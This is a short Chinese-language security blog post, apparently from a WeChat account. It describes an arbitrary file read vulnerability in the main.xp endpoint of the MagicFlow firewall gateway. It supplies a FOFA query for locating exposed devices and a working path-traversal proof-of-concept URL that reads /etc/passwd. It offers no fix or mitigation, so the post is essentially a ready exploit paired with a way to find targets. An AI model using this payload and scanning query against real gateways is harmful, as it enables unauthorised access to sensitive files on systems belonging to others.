#  MagicFlow-防火墙网关-main.xp-任意文件读取漏洞   
骇客安全  骇客安全   2025-03-22 14:21  
  
# 漏洞描述  
  
MagicFlow 防火墙网关 main.xp 存在任意文件读取漏洞，攻击者通过构造特定的Url获取敏感文件  
  
## 漏洞影响  
```
MagicFlow 防火墙网关
```  
  
## FOFA  
```
app="MSA/1.0"
```  
  
## 漏洞复现  
  
登录页面如下  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N5mbjCIxZ0IItsO4ibAl72pM2YMiaG733ibppy5ufxumBJMcyGsXA3epHbppW6DZfYQLXHRBlM7fv7w/640?wx_fmt=png&from=appmsg "null")  
  
  
构造POC  
  
```
/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N5mbjCIxZ0IItsO4ibAl72pLKhTpRGUgI5yOnwpOFj5K2aTovUvyVUEiafbzlFia2cFzcT0VK170jsA/640?wx_fmt=png&from=appmsg "null")  
  
  
  
